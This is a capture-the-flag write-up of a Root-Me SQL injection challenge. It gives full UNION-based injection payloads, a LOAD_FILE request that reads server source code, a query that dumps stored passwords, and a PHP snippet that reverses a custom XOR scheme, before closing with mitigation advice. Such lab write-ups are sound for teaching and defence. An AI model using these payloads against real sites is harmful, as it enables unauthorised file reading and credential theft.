# SQL Injection - File Reading & Source Analysis

**Date:** March 20, 2026  
**Platform:** Root-Me  
**Difficulty:** Medium  
**Category:** Web / Server-Side  

## 📝 Executive Summary
In this engagement, I exploited a Boolean/UNION-based SQL Injection vulnerability on a MariaDB backend. Beyond simple data extraction, I leveraged the `LOAD_FILE()` function to exfiltrate server-side PHP source code. By analyzing the application's internal logic, I identified a custom XOR-based obfuscation routine, allowing me to reverse the stored credentials and recover the administrator's plaintext password.

## 🔍 Initial Analysis
The target application manages a member directory. The `id` parameter in the members section was identified as the primary attack vector.

### Vulnerability Identification
Appending a single quote (`'`) to the `id` parameter triggered a MariaDB syntax error, confirming the entry point:
`...?action=members&id=1'`

## 🚀 Exploitation Phase

### 1. Structural Reconnaissance
I used the `ORDER BY` technique to determine the number of columns in the original query:
* `id=1 ORDER BY 4--+` (Success)
* `id=1 ORDER BY 5--+` (Error: Unknown column '5')
**Result:** The query selects **4 columns**.

### 2. Identifying Reflected Slots
I used a `UNION ALL SELECT` statement to see which columns are rendered in the UI:
`?action=members&id=.1 UNION ALL SELECT 1,2,3,4--+`
**Result:** Columns **1, 2, and 4** are visible on the page and can be used for data exfiltration.

### 3. Exfiltrating Source Code
Since the database user had file-read permissions, I used `LOAD_FILE()` to read the server's index file. To bypass potential filters on slashes, I converted the file path to Hex.

**Payload:**
`?action=members&id=.1 UNION ALL SELECT 1,load_file(0x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870),3,4--+`

## 🧠 Source Code Analysis
The exfiltrated `index.php` revealed a custom authentication routine:
1. The app stores a `member_password` as a Base64 string.
2. It uses a static XOR key: `c92fcd618967933ac463feb85ba00d5a7ae52842`.
3. The logic: `SHA1(input) == XOR(Key, Base64_Decode(DB_Pass))`.

## 🔓 Credential Recovery

### 1. Dumping Encrypted Hash
I pulled the encrypted string from the `member` table:
`?action=members&id=.1 UNION ALL SELECT 1,member_password,3,4 FROM member--+`
**Encrypted String:** `VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==`

### 2. Reversing the XOR
Using a local PHP script to reverse the operation:
```php
$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
$enc = "VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA==";
echo stringxor($key, base64_decode($enc));
```
**Resulting SHA-1 Hash:** `77be4fc97f77f5f48308942bb6e32aacabed9cef`

### 3. Hash Cracking
The recovered SHA-1 hash was searched against known rainbow tables and hash databases.
**Plaintext Password:** `superpassword`

## 🛠️ Mitigation & Lessons Learned
1. **Disable `LOAD_FILE`:** If not strictly required, the database user should not have the `FILE` privilege (Secure-file-priv).
2. **Standard Cryptography:** Never use custom XOR/Base64 "encryption." Use industry-standard, salted hashing algorithms like Argon2 or BCrypt.
3. **Parameterization:** Use prepared statements to prevent UNION-based injections entirely.
